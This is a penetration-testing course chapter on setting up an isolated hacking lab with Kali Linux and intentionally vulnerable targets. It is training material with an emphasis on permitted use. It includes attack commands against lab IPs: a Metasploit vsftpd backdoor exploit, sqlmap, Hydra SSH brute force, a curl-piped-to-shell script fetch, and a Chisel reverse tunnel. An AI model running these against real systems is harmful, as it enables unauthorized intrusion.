# Chapter 75: Building Your Hacking Lab — The Hands-On Environment

*Everything in this course becomes real when you have a lab to practice in. A proper lab is the difference between knowing theory and being able to actually hack.*

---

## Why a Lab?

- **Legal:** Practice only on systems you own or have permission to attack
- **Safe:** Break things without consequences
- **Repeatable:** Reset and try again
- **Offline:** No internet dependencies for most practice
- **Real:** Understanding emerges from doing, not reading

---

## Lab Architecture

```
Your Machine (Host)
│
├── Kali Linux VM (Attacker)
│   └── Network: isolated lab network
│
├── Metasploitable3 (Linux Target)
│   └── Network: isolated lab network
│
├── Windows Server 2019 VM (Windows Target)
│   └── Network: isolated lab network
│
├── Ubuntu Server 22.04 (Web App Target)
│   └── Network: isolated lab network
│       └── Run: DVWA, WebGoat, Juice Shop
│
└── pfSense (Optional: Firewall VM)
    └── Network: between attacker and targets
```

**Networks:**
- `lab-network` (192.168.100.0/24): isolated, VMs talk to each other
- `internet-network`: Kali can reach internet (for updates, downloads)

---

## Hardware Requirements

**Minimum:**
- CPU: 4 cores (8 threads better)
- RAM: 16GB (32GB for comfortable multi-VM)
- Storage: 200GB SSD free

**Recommended:**
- CPU: 6+ cores
- RAM: 32GB
- Storage: 500GB SSD (NVMe for better VM performance)

**Budget option:** An old ThinkPad T-series (T470/T480/T490) with 16-32GB RAM can run 3-4 VMs comfortably. They're cheap on eBay.

---

## Virtualization Software

### Option 1: VirtualBox (Free, Cross-platform)

```bash
# Install on Ubuntu/Debian
sudo apt install virtualbox

# Install Guest Additions for clipboard, shared folders
# From VirtualBox menu: Devices → Insert Guest Additions CD
```

### Option 2: VMware Workstation Pro (Paid, better performance)

Better snapshot handling, USB passthrough, and stability than VirtualBox.

### Option 3: Proxmox (Free, Linux only — best for dedicated machines)

Bare-metal hypervisor. Install on a dedicated machine. Manage via web browser.
Best if you have an old PC to dedicate as a lab server.

---

## Setting Up Kali Linux (Attacker VM)

Kali Linux is the standard penetration testing distro — comes with 600+ tools pre-installed.

```bash
# Download: https://www.kali.org/get-kali/
# Choose: Kali Linux 64-Bit (Installer) ISO

# After installation:
sudo apt update && sudo apt full-upgrade -y

# Install missing tools you'll need
sudo apt install -y \
    gobuster \
    ffuf \
    feroxbuster \
    nuclei \
    pspy64 \
    seclists \
    wordlists

# Go installation (for building tools from this course)
wget https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
go version
```

### Essential Kali Tool Directory

```
/usr/share/wordlists/       → Password and directory wordlists
/usr/share/exploitdb/       → Exploit-DB local mirror
/usr/share/nmap/scripts/    → NSE scripts for service detection
/usr/share/metasploit-framework/ → Metasploit modules
```

---

## Setting Up Vulnerable Targets

### Target 1: Metasploitable2 (Quick Start)

```bash
# Download: sourceforge.net/projects/metasploitable/
# It's a pre-built VM — just import into VirtualBox/VMware

# Default credentials: msfadmin/msfadmin
# Running many intentionally vulnerable services:
# FTP (vsftpd 2.3.4 — backdoor!)
# SSH (OpenSSH — weak config)
# HTTP (DVWA, phpMyAdmin, TWiki)
# PostgreSQL (postgres/postgres)
# MySQL (root/no password!)
# Samba (buffer overflow)
# ... many more
```

### Target 2: DVWA (Damn Vulnerable Web App)

```bash
# Run with Docker (easiest)
docker run -d -p 80:80 vulnerables/web-dvwa

# Access: http://192.168.100.X/
# Login: admin/password

# Set security level to Low first, then Medium, then High
# Covers: SQLi, XSS, CSRF, Command Injection, File Inclusion, File Upload
```

### Target 3: OWASP WebGoat

```bash
# Run with Docker
docker run -p 8080:8080 -p 9090:9090 webgoat/goat-and-wolf

# Access: http://localhost:8080/WebGoat
# Register any account
# Interactive lessons: click "Challenge" tabs to test yourself
```

### Target 4: Juice Shop (Modern App)

```bash
# OWASP's modern JavaScript single-page app with 100+ challenges
docker run -d -p 3000:3000 bkimminich/juice-shop

# Access: http://localhost:3000
# Has CTF-style challenges with scoring
# Good for modern web security (JWT, API security, etc.)
```

### Target 5: TryHackMe / Hack The Box (Online)

No local setup needed. Use your Kali VM to VPN in.

```bash
# TryHackMe
# 1. Create account at tryhackme.com
# 2. Download OpenVPN config
# 3. On Kali: sudo openvpn your-config.ovpn
# 4. Access machines at their IP addresses

# Start with: "Pre-Security" path → "Introduction to Cybersecurity" path

# Hack The Box
# hackthebox.com
# Harder machines, great community
# Use "Starting Point" machines to begin
```

---

## Network Configuration

### VirtualBox: Create Lab Network

```
1. VirtualBox → File → Host Network Manager
2. Create network: "vboxnet0"
   - IP: 192.168.100.1/24
   - DHCP: enabled (192.168.100.100 to .200)

3. Each VM: Settings → Network
   - Adapter 1: NAT (for internet)
   - Adapter 2: Host-Only Adapter → vboxnet0 (for lab)

4. Verify on Kali:
   ip addr show       # see 192.168.100.x address
   ping 192.168.100.101  # ping target VM
```

---

## Tools to Master

### Reconnaissance

```bash
# Nmap — network scanner (essential)
nmap -sV -sC -p- 192.168.100.101    # full scan with scripts
nmap -sU --top-ports 100 192.168.100.101  # UDP scan

# Gobuster / Feroxbuster — directory bruting
gobuster dir -u http://192.168.100.101 \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,html,txt

# Nuclei — template-based vulnerability scanner
nuclei -u http://192.168.100.101
```

### Exploitation

```bash
# Metasploit
msfconsole
msf> search vsftpd 2.3.4
msf> use exploit/unix/ftp/vsftpd_234_backdoor
msf> set RHOSTS 192.168.100.101
msf> run

# SQLMap — automated SQL injection
sqlmap -u "http://192.168.100.101/page.php?id=1" --dbs

# Hydra — brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    ssh://192.168.100.101
```

### Post-Exploitation

```bash
# LinPEAS — privilege escalation enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Pspy — monitor processes without root
./pspy64

# Chisel — port forwarding / tunneling
./chisel server -p 8000 --reverse   # on your Kali
./chisel client YOUR_IP:8000 R:9001:localhost:9001  # on target
```

---

## Go Security Tools — Your Lab Environment

This course's tools are designed to run in your lab:

```bash
# Build all tools from this course
mkdir ~/goshield-tools
cd ~/goshield-tools

# Port scanner (Chapter 14)
git clone ... && cd port-scanner && go build -o portscanner .
./portscanner -host 192.168.100.101 -start 1 -end 65535

# SQL injection tester (Chapter 23)
cd ../sqli-tester && go build -o sqlitest .
./sqlitest -url "http://192.168.100.101/app.php?id=1"

# GoShield agent (Chapters 58-67) — run on targets
cd ../goshield/agent && go build -o goshield-agent .
# On target: ./goshield-agent
# On Kali: run the GoShield server and watch alerts come in
```

---

## Practice Workflow

### For Each New Machine (CTF/Lab)

```
Phase 1: Reconnaissance (15-30 min)
  □ nmap -sV -sC -p- <IP>
  □ gobuster/ffuf on any web services
  □ Enumerate found services manually
  □ Take notes on everything

Phase 2: Vulnerability Identification (15-30 min)
  □ Look up service versions in CVE databases
  □ Search exploit-db for known exploits
  □ Test web apps manually (Burp Suite)
  □ Check for misconfigurations

Phase 3: Exploitation (30-60 min)
  □ Try simplest exploit first
  □ Document exactly what you tried
  □ Get a shell

Phase 4: Post-Exploitation (30-60 min)
  □ id / whoami — who are you?
  □ Run linpeas/winpeas
  □ Find the way to root
  □ Capture the flag

Phase 5: Document
  □ Write up the methodology
  □ Screenshots of key steps
  □ Add to GitHub portfolio
```

---

## Recommended Learning Path Using the Lab

### Month 1: Foundations
- Set up Kali + Metasploitable2
- Complete TryHackMe "Pre-Security" path
- Practice nmap, gobuster, basic enumeration

### Month 2: Web Security
- Work through DVWA (all levels)
- Complete WebGoat lessons
- PortSwigger Web Security Academy (free labs!)
- Practice SQL injection, XSS, CSRF manually

### Month 3: System Security
- Work through privilege escalation rooms on TryHackMe
- Root 10 Hack The Box "Easy" machines
- Practice with Metasploit on Metasploitable2

### Month 4: CTF Competitions
- PicoCTF — beginner CTF
- CTFtime.org — find upcoming competitions
- Write-ups after each solve

### Ongoing: Hack The Box
- Aim for 1 machine per week
- Write up every machine
- Join the Discord community

---

## Security Lab Rules

1. **Never attack real systems** — only machines you own or have explicit permission to test
2. **Isolate your lab network** — prevent lab VMs from attacking the internet accidentally
3. **Snapshot before exploiting** — easy reset
4. **Keep notes** — you'll want to reference your methodology later
5. **Read others' write-ups** — learning how others approach machines is legitimate

---

## Summary

| Component | Purpose | Tool |
|-----------|---------|------|
| Kali Linux | Attacker machine | Download from kali.org |
| Metasploitable2 | Vulnerable Linux target | sourceforge |
| DVWA | Vulnerable web app | Docker |
| WebGoat | Web security training | Docker |
| Juice Shop | Modern web app challenges | Docker |
| TryHackMe | Guided online rooms | tryhackme.com |
| Hack The Box | Realistic machines | hackthebox.com |

With this lab, every chapter of this course becomes hands-on. Build the tools, run them against the targets, understand the output.

---

## Exercises

1. Set up Kali Linux and Metasploitable2. Run a full nmap scan on Metasploitable2. Document all open ports and services.
2. Exploit the vsftpd 2.3.4 backdoor on Metasploitable2 using Metasploit. Get a root shell.
3. Set up DVWA. Exploit all 6 vulnerability categories at the "Low" security level.
4. Deploy the GoShield agent on Metasploitable2. Attack it from Kali and watch the alerts come in.
5. Complete 3 TryHackMe rooms and write up your methodology for each one.
